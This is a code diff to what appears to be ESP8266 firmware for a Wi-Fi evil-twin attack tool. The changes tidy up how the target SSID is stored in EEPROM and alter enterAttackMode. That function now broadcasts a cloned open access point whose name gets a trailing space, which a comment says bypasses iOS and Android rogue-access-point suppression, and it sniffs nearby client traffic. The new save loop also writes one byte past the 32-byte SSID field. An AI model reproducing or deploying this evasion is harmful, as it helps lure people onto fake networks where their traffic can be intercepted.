@@ -91,8 +91,14 @@ static bool loadConfig(void)
         if (targetBSSID[i] == 0xFF) ff++;
         if (targetBSSID[i] == 0x00) zz++;
     }
-    for (int i = 0; i < 32; i++)
-        targetSSID[i] = (char)EEPROM.read(EE_SSID + i);
+    for (int i = 0; i < 32; i++) {
+        char c = (char)EEPROM.read(EE_SSID + i);
+        if (c == (char)0xFF || c == '\0') {
+            targetSSID[i] = '\0';
+            break;
+        }
+        targetSSID[i] = c;
+    }
     targetSSID[32] = '\0';
     targetChannel = EEPROM.read(EE_CH);
     if (targetChannel < 1 || targetChannel > 13) targetChannel = 6;
@@ -114,7 +120,12 @@ static void saveConfig(void)
 {
     EEPROM.begin(EE_SIZE);
     for (int i = 0; i < 6;  i++) EEPROM.write(EE_BSSID + i, targetBSSID[i]);
-    for (int i = 0; i < 32; i++) EEPROM.write(EE_SSID  + i, targetSSID[i]);
+    
+    int len = strlen(targetSSID);
+    if (len > 32) len = 32;
+    for (int i = 0; i < len; i++) EEPROM.write(EE_SSID + i, targetSSID[i]);
+    for (int i = len; i < 33; i++) EEPROM.write(EE_SSID + i, 0x00);
+    
     EEPROM.write(EE_CH, targetChannel);
     EEPROM.commit();
     EEPROM.end();
@@ -751,7 +762,13 @@ static void enterAttackMode(void)
 
     WiFi.mode(WIFI_AP);
     WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(targetSSID, NULL, targetChannel);
+    
+    /* Padding SSID with a space to bypass modern iOS/Android Rogue AP suppression */
+    String spoofedSSID = String(targetSSID);
+    if (spoofedSSID.length() > 0 && spoofedSSID.length() < 32) {
+        spoofedSSID += " ";
+    }
+    WiFi.softAP(spoofedSSID.c_str(), NULL, targetChannel);
 
     sniffedCount = 0; // reset active clients
     wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
